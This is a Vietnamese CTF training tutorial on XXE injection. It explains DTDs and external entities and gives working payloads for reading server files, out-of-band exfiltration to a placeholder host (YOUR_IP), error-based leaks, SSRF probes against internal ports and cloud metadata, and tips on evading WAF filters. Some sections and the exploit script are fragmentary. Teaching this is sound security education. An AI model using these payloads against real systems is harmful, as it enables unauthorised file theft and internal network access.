XXE — XML External Entity

Khi trang web nhận dữ liệu XML (upload file cấu hình, SVG, import dữ liệu, một số API SOAP) và dùng bộ phân tích XML (parser) chưa tắt tính năng "entity ngoài" — bạn có thể tự định nghĩa một "từ viết tắt" trỏ tới file trên server hoặc một địa chỉ mạng nội bộ, khiến parser tự đọc hộ bạn nội dung đó.

XXE là gì, để làm gì?

XML là một định dạng dữ liệu có cấu trúc (giống HTML nhưng tự do hơn), dùng trong file cấu hình, SOAP API, file SVG, file Office (docx/xlsx thực chất là zip chứa nhiều file XML bên trong). Chuẩn XML có một tính năng tên là DTD (Document Type Definition) cho phép định nghĩa "entity" — một kiểu từ viết tắt, khi parser gặp sẽ tự thay bằng nội dung thật. Chuẩn XML cho phép entity đó trỏ ra file bên ngoài (external entity) — nếu app không tắt tính năng này, bạn tự định nghĩa 1 entity trỏ tới /etc/passwd hay một địa chỉ nội bộ, và parser sẽ tự đọc/truy cập hộ bạn, rồi nhét kết quả vào ngay trong response.

Nếu chỉ nhớ một điều Dấu hiệu nhận ra: thấy app nhận file XML, SVG, hoặc API dạng SOAP (Content-Type application/xml, hoặc file upload có đuôi .xml/.svg). Payload luôn bắt đầu bằng khai báo <!DOCTYPE ... [ <!ENTITY ... > ]> rồi gọi entity đó bằng &tên_entity; ở chỗ dữ liệu được hiển thị ra.

⚡ XXE — XML EXTERNAL ENTITY
🚩 Nhận ra trong 30 giây App nhận XML/SVG/SOAP trực tiếp, hoặc upload file mà bạn đoán bên trong là XML (docx/xlsx/svg). Gửi payload đọc /etc/hostname (mục 💥) → nếu response chứa nội dung file đó ⟹ XXE xác nhận.
✅ Tiền đề cần có Server dùng XML parser chưa tắt DOCTYPE/external entity (mặc định của rất nhiều thư viện parser cũ — nhiều ngôn ngữ chỉ an toàn mặc định ở bản mới).

01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

XML — định dạng dữ liệu dùng thẻ mở/đóng giống HTML: <user><name>Nam</name></user>.
DTD (Document Type Definition) — một khối khai báo đặt ở đầu file XML, mô tả cấu trúc hợp lệ của file đó, và quan trọng nhất với bài này: cho phép định nghĩa entity.
Entity — một "biến" đặt tên, khi gọi bằng &tên; ở bất kỳ đâu trong XML, parser sẽ thay bằng giá trị đã định nghĩa. Ví dụ HTML cũng có entity quen thuộc: &amp; thay cho dấu &.
External entity — entity có giá trị không phải chuỗi cố định, mà là đường dẫn file hoặc URL (khai báo bằng từ khóa SYSTEM). Khi parser gặp, nó sẽ tự đi mở file đó / gọi URL đó rồi lấy nội dung làm giá trị entity — đây chính là hành vi bị lợi dụng.

Server nhận XML và parse bằng thư viện chuẩn của ngôn ngữ (ví dụ Python xml.etree.ElementTree, hoặc tệ hơn là lxml cấu hình mặc định cũ), hiển thị lại giá trị 1 trường nào đó ra trang kết quả:

# Python
from lxml import etree
doc = etree.fromstring(user_xml_input)   # mặc định cũ: resolve_entities=True
print(doc.find("name").text)   # in ra giá trị, bao gồm cả entity đã resolve
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Parser "ngoan ngoãn" làm theo DTD do CHÍNH NGƯỜI GỬI khai báo

Chuẩn XML cho phép người tạo ra file tự khai báo DTD ngay trong chính file đó (không phải lúc nào DTD cũng nằm ở nơi khác, do bên thứ ba kiểm soát). Vì vậy khi bạn (kẻ tấn công) là người gửi file XML, bạn cũng là người tự viết luôn phần DTD — bạn tự định nghĩa entity trỏ tới bất kỳ đâu bạn muốn, và parser (nếu không bị cấu hình chặn) vẫn trung thành làm theo, không phân biệt được "DTD này do ứng dụng viết sẵn" hay "DTD này do kẻ tấn công tự nhét vào".

Đây là lý do nhiều ngôn ngữ/thư viện gần đây đổi mặc định sang tắt sẵn external entity (Python 3.7+ xml.etree an toàn mặc định, Java sau bản vá cần bật cờ an toàn thủ công, PHP libxml_disable_entity_loader() tồn tại nhưng phải tự gọi) — nhưng rất nhiều code CTF/thực tế vẫn dùng cấu hình cũ hoặc thư viện bên thứ ba không an toàn mặc định.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Từ 1 dòng DTD tới đọc được file hệ thống

Ví dụ bằng payload thật đi hết chuỗi:

<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><root>&xxe;</root>
<!DOCTYPE foo [ ... ]> — khai báo DTD cho tài liệu tên foo (tên này tùy ý, không quan trọng), mọi thứ trong cặp ngoặc vuông [ ] là nơi định nghĩa entity.
<!ENTITY xxe SYSTEM "file:///etc/hostname"> — định nghĩa entity tên xxe, kiểu SYSTEM (external — trỏ ra ngoài), giá trị là nội dung file /etc/hostname.
&xxe; — "gọi" entity vừa định nghĩa, đặt đúng chỗ giá trị muốn hiện ra trong response.
Response mong đợi: nếu app in lại nội dung thẻ <root>, bạn sẽ thấy chính nội dung file /etc/hostname (tên máy chủ) xuất hiện ở đúng chỗ &xxe;.

06 / PAYLOAD ĐẦY ĐỦ THEO TÌNH HUỐNG

Chọn đúng kỹ thuật khi response không hiện trực tiếp

A. Đọc file trực tiếp (app in ra response) thử trước

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>

B. Blind / OOB (app KHÔNG in ra response trực tiếp) cần listener

Dùng khi payload A chạy không lỗi nhưng cũng không thấy nội dung file đâu — app xử lý xong rồi bỏ qua giá trị, không hiển thị. Lúc này phải "gửi" dữ liệu ra một server do bạn kiểm soát (phải nằm trong mạng thi đấu, vì A/D không có Internet ra ngoài):

-- bước 1: dựng 1 file DTD "ngoài" trên máy bạn, host bằng python http.server --
evil.dtd:
<!ENTITY % file SYSTEM "file:///flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP:8000/leak?d=%file;'>">
%eval;
%exfil;

-- bước 2: payload gửi cho challenge, trỏ ra file DTD trên --
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/evil.dtd"> %xxe; ]>
<root>test</root>
%file / %eval / %xxe (dấu % thay vì &) — gọi là parameter entity, chỉ dùng được bên trong chính DTD (khác entity thường dùng trong nội dung XML). Cần dùng loại này vì logic đọc-rồi-gửi phải chạy ngay trong lúc DTD đang được xử lý.
Kỹ thuật này gọi là OOB (out-of-band) qua DTD ngoài: file DTD thứ hai (do bạn host) định nghĩa thêm 1 entity mới lúc "chạy", entity đó tự ghép nội dung file đọc được vào URL rồi gọi ra ngoài tới server bạn — bạn xem log HTTP server của mình để lấy flag.

C. Error-based (khi response chỉ hiện thông báo lỗi parser)

<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///flag.txt">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>

Nếu app hiện nguyên văn lỗi parser (kiểu "failed to open file /nonexistent/FLAG_CONTENT_HERE"), nội dung flag sẽ lộ ngay trong thông báo lỗi — không cần listener.

D. XXE qua SSRF (đọc dịch vụ nội bộ thay vì file)

<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">         // dò port nội bộ
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">  // cloud metadata (nếu có mô phỏng cloud)
Entity SYSTEM chấp nhận cả URL http://, không chỉ file:// — nghĩa là XXE cũng là một con đường dẫn tới SSRF (xem bài SSRF riêng để biết cách tận dụng tiếp).

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>

print("FLAG:", exploit_xxe("TARGET_IP"))

10 / PHÒNG THỦ: VIẾT WAF RULE

Chặn đúng payload, không chặn nhầm request thường

Rule (regex)Khớp gì

13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng ví dụ mục 09 bằng tay trên Burp, từ upload XML thường tới khi đọc được flag.

⭐⭐ Đổi 1 biến: challenge không in giá trị entity ra response (app chỉ trả "Import thành công"). Dựng listener OOB để lấy flag.

Gợi ý nếu kẹtThử biến thể hoa/thường SyStEm (XML không phân biệt hoa thường ở từ khóa DTD tùy implementation) hoặc chia nhỏ payload qua nhiều entity lồng nhau để né pattern matching đơn giản.

Thuật ngữ

DTDKhối khai báo cấu trúc/entity ở đầu tài liệu XML.
Entity / External entity"Biến" trong XML; loại external trỏ ra file/URL ngoài, được parser tự mở.
Parameter entity (%)Loại entity đặc biệt chỉ dùng được bên trong chính DTD, cần cho kỹ thuật OOB.
OOB (Out-of-Band)Kỹ thuật lấy dữ liệu ra qua một kênh phụ (ở đây là HTTP request tới server của kẻ tấn công) khi không đọc được trực tiếp từ response.
